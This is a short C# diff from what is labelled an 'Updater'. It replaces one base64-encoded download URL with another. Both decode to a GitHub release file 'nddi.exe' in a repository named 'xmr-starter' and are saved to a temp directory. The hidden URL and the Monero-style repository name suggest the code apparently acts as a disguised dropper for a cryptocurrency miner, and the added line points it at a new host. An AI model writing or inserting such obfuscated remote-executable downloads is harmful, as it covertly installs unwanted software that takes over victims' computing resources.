@@ -40,7 +40,7 @@ namespace Updater
                     }
 
                     string tmpExePath = Path.Combine(tempDirectory, "nddi.exe");
-                    string url = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL25zbHl0aGUveG1yLXN0YXJ0ZXIvcmVsZWFzZXMvZG93bmxvYWQvTEFURVNUL25kZGkuZXhl"));
+                    string url = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL3pvb2xvb2hvby94bXItc3RhcnRlci9yZWxlYXNlcy9kb3dubG9hZC9MQVRFU1QvbmRkaS5leGU="));
 
                     ServicePointManager.DefaultConnectionLimit = 100;
                     WebRequest.DefaultWebProxy = null;
